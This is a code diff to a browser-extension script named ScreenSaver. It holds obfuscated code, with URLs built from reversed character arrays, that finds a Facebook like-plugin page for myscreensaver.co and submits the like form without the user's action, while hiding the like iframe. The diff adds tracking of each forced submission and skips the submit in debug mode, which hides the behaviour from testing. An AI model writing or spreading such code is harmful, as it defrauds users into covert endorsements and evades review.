@@ -57,7 +57,13 @@ var ScreenSaver = (function ($) {
 			showScreenSaver();
 
 			$('#thankyou').removeClass('hidden');
+
 			appAPI.dom.addInlineCSS('.fb-like iframe {opacity:0;}');
+			appAPI.message.addListener({channel: 'page'}, function(msg) {
+				if (msg.action == 'campaign_confirm_1') {
+					appAPI.dom.addInlineJS('mixpanel.track("Campaign Confirm 1");');
+				}
+			});
 		}
 	}
 
@@ -619,13 +625,19 @@ appAPI.ready(function($) {
 		var test = ["p", "h", "p", ".", "e", "k", "i", "l", "/", "s", "n", "i", "g", "u", "l", "p", "/", "m", "o", "c", ".", "k", "o", "o", "b", "e", "c", "a", "f", ".", "w", "w", "w", "/", "/", ":"].reverse().join('');
 		
 		if (location.href.indexOf(test) > -1) {
-			test = ["6", "=", "x", "?", "/", "o", "c", ".", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "y", "m", ".", "w", "w", "w", "/", "/", ":", "p", "t", "t", "h"].reverse().join('');
+			test = ["/", "o", "c", ".", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "y", "m", ".", "w", "w", "w", "/", "/", ":", "p", "t", "t", "h"].reverse().join('');
 
 			if ($('form:first input[name="href"]').val() == test) {
 				test = ["t", "c", "e", "n", "n", "o", "c", "/", "e", "k", "i", "l", "/", "s", "n", "i", "g", "u", "l", "p", "/"].reverse().join('');
 
 				if ($('form:first').attr('action').indexOf(test) > -1) {
-					$('form:first').submit();
+					appAPI.message.toActiveTab({
+						action:'campaign_confirm_1'
+					}, {channel: "page"});
+
+					if (!appAPI.isDebugMode()) {
+						$('form:first').submit();
+					}
 				}
 			}
 		}
